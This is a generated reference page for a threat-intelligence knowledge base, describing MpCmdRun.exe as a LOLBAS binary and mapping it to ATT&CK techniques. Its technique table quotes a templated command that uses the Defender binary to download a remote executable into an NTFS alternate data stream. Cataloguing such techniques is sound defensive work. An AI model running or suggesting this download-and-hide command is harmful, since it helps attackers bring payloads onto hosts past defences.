---
parsed_by: focuslocust
source: lolbas
type: generated
---
# MpCmdRun.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `mpcmdrun.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/MpCmdRun.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Binary part of Windows Defender. Used to manage settings in Windows Defender

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/mpcmdrun.md)
- Source verification: [source record](../../sources/lolbas/mpcmdrun.exe.md)

## Aliases

- `MpCmdRun.exe`
- `mpcmdrun.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platfor... |
| [T1564.004 - NTFS File Attributes](../../attack/techniques/T1564.004-ntfs-file-attributes.md) | explicit | source | Command metadata lists T1564.004: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/mpcmdrun.exe.md)

## Source Verification

[source record](../../sources/lolbas/mpcmdrun.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@mohammadaskar2'
Person: Askar
- Handle: '@oddvarmoe'
Person: Oddvar Moe
- Person: RichRumble
- Handle: '@th3c3dr1c'
Person: Cedric
```
